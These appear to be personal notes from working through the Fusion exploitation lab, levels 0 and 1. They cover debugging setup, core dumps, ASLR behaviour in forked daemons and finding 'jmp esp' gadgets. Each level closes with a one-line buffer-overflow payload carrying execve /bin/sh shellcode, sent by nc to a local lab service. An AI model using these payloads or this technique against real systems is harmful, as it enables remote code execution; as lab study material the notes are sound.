Generic:
    - Set up Port Forwarding and SSH to your box instead of working on a VirtualBox console
    - Make sure you can generate core dumps as a normal user and root. With and without gdb
    - ulimit -a showed unlimited and my logged in user could create core dumps (sleep 1000& and killall -SIGSEGV sleep work)
    - /var/crash owned by all but process owned by some random uid (20000) couldn't create a core dump in it. Had to change core_pattern
        - Note here that parent generated core dump but child process (which was the target) did not do so. All via strace
        - Process run as daemons. Restarting processes change buffer addresses into which user input goes, and seem to remain constant until process is killed
    - Set your .gdbinit file up. For daemon processes you almost always want to debug the child process. Use neg9 PPT which has some neat tricks
    - Type shell code you use often into .asm or .c. Compile. Link. Run. See if a shell pops. Don't do blindly with shell code on the Internet
        http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html
    - strace will show your shell executing, you won't get a seg fault or/and core-dump but the shell never appears. Why? I have no clue. :/
        - True of tty (via ssh) and console
        - Commands like pwd or ls or id run though
        - Using a bindshell for shell code with a sleep 'kinda' works, but the moment I telnet into the port the connection closes
        - Have to use the Telnetlib technique. That does work. Thx Neg9 :)
    - Try jmp esp method, but if there's no such instruction in program this will fail.
        https://penturalabs.wordpress.com/2011/03/31/vulnerability-development-buffer-overflows-how-to-bypass-full-aslr/
    - Forked daemon. Unless parent dies, ASLR not useful if logic in child.
        killall level00; /usr/bin/setarch i386 -X /opt/fusion/bin/level00 confirms this. Got this from http://www.kroosec.com/2013/03/fusion-level01.html
    - set disable-randomization off to help you not be confused while solving challenge binaries :)
    - objdump -d is DIFFERENT from objdump -D
    - Remember, as soon as an instruction finishes, it looks immediately after ... to find the next instruction. So put your shell code immediately after and
      verify it got copied properly
    - Add NOPSled after seeing what part of it got smashed

Good Reads:
    Lots of ASLR bypass. Seems to be a common paper to refer to.
        - http://web.textfiles.com/hacking/smackthestack.txt

Level 0:
    - Reverse algorithm. Request has to be in specific HTTP request format
    - man strchr. Seriously. Took me half an hour of head scratching thinking how I knew strchr worked :/. Ditto for all system calls
    - ret in main is 1092 or something away and read() takes a max of 1024 so no overflow in main
    - strcpy in fix_path. Get your syntax right though
    - Address will change but here's the structure of the solution below

    Solution: python -c 'print "GET "+"x"*139+"\xe4\xf3\xff\xbf"+" HTTP/1.1"+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'|nc -vvv 127.0.0.1 20000

Level 1:
    - Same program as above. But shared libraries all ASLR.
    - Also no buffer address this time. That we could have used to calculate the return address.
    - Stangely though, the same exploit with a different address works. This is because the parent is NOT dying and the address is the same. The forked child
      takes the same address each time.
    - Looked at initial bits of some solutions, only when proc restarts, address changes. Oh well. Guess THAT is how I should try and solve it.
    - No PIE though, so we have predictable addresses in the .text section/the actual code which we could re-use
    - Search for jmp esp. Cant f***(&(*&*( find it. It isnt there. NO NO NO.
    - Oh its there, just learn to read man pages better :/
        objdump -D level01 | grep -i 'ff e4' and then grab an address from the middle of the instruction. Searching for jmp or call wont give you a thing.
    
    Solution: python -c 'print "GET "+"x"*139+"\x4f\x9f\x04\x08"+"\x90"*40+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+" HTTP/1.1"'|nc -vvv 127.0.0.1 20001
